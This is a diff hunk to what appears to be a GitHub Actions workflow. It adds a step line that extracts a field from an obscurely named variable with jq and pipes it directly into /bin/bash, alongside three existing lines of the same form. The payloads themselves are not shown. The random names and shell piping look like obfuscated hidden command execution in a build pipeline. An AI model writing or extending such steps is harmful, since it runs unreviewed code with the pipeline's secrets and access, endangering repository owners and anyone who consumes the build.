@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$fi547" | jq -r .z0 | /bin/bash
           printf '%s' "$o60" | jq -r .n3519 | /bin/bash
           printf '%s' "$hnfd5" | jq -r .thtb75750 | /bin/bash
+          printf '%s' "$u11" | jq -r .xx1221 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
